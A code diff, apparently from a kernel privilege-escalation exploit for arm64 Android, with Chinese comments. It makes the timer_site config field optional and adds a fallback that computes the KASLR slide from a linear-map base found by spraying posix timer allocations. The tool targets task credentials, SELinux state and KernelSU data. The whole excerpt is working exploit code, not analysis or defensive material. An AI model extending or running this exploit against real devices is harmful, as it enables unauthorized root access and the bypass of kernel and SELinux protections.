@@ -216,12 +216,26 @@ static int load_conf(const char *path)
         parse_conf_line(line);
     fclose(f);
 
-    if (!g_cfg.timer_site || !g_cfg.selinux_state || !g_cfg.task_cred_off ||
+    if (!g_cfg.selinux_state || !g_cfg.task_cred_off ||
         !g_cfg.copy_process_low21 || !g_cfg.task_alloc_bytes || !g_cfg.ksu_kmi[0])
     {
         fprintf(stderr, "[-] conf missing required fields\n");
         return -1;
     }
+    /*
+     * timer_site 可选（0.71 起）：
+     *   有 —— 用低 21 位在 trace 里认出目标分配，slide = site0 - timer_site
+     *   无 —— 退回按 bytes_req/bytes_alloc == timer_alloc 认，slide 由
+     *         plant_base 投票出的线性映射基址反推（g_base - PAGE_OFFSET）
+     * 两条路都需要 timer_alloc，否则认不出 posix_timers_cache 的对象。
+     */
+    if (!g_cfg.timer_alloc)
+    {
+        fprintf(stderr, "[-] conf needs timer_alloc (used to identify the allocation)\n");
+        return -1;
+    }
+    if (!g_cfg.timer_site)
+        fprintf(stderr, "[!] no timer_site in conf; falling back to size+base calibration\n");
     return 0;
 }
 
@@ -405,7 +419,13 @@ static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
         if (u32(b, i - 4) != (unsigned)pid)
             continue;
         site = u64(b, i);
-        if ((site & 0x1fffffULL) != (g_cfg.timer_site & 0x1fffffULL))
+        /*
+         * 有 timer_site 时用低 21 位当指纹（KASLR 是 2 MB 对齐，页内偏移不变）。
+         * 没有时不做 site 过滤，靠下面的 bytes_req/bytes_alloc 认 —— 和
+         * scan_cred_allocs 用 cred_req/cred_alloc 认 cred 分配是同一思路。
+         */
+        if (g_cfg.timer_site &&
+            (site & 0x1fffffULL) != (g_cfg.timer_site & 0x1fffffULL))
             continue;
         ptr = u64(b, i + 8);
         {
@@ -1749,7 +1769,22 @@ static void run_plant(unsigned long long target, int tag, int mode,
             slab_own++;
     pfn = (V - g_base) >> 12;
     slab_pfn = pfn & ~1ULL;
-    g_slide = site0 - g_cfg.timer_site;
+    /*
+     * slide 的两条来源：
+     *   ① conf 里有 timer_site：site0 是本次观测到的运行时调用点，
+     *      减去静态值即得（原路径，最精确）。
+     *   ② 没有 timer_site：plant_base 已经用 virt-(pfn<<12) 投票出线性映射
+     *      基址，slide = g_base - PAGE_OFFSET。arm64 39-bit VA 的 PAGE_OFFSET
+     *      是 0xffffff8000000000，与下面 sys_exit_tp 的合法性下界同一个值。
+     */
+    if (g_cfg.timer_site)
+        g_slide = site0 - g_cfg.timer_site;
+    else if (g_base)
+        g_slide = g_base - 0xffffff8000000000ULL;
+
+    if (g_slide & 0x1fffffULL)
+        logf("[!] slide %#llx not 2 MB aligned (site0=%#llx base=%#llx)\n",
+             g_slide, site0, g_base);
 
     {
         size_t off = (size_t)((V & 0x1fff) + 0x78);
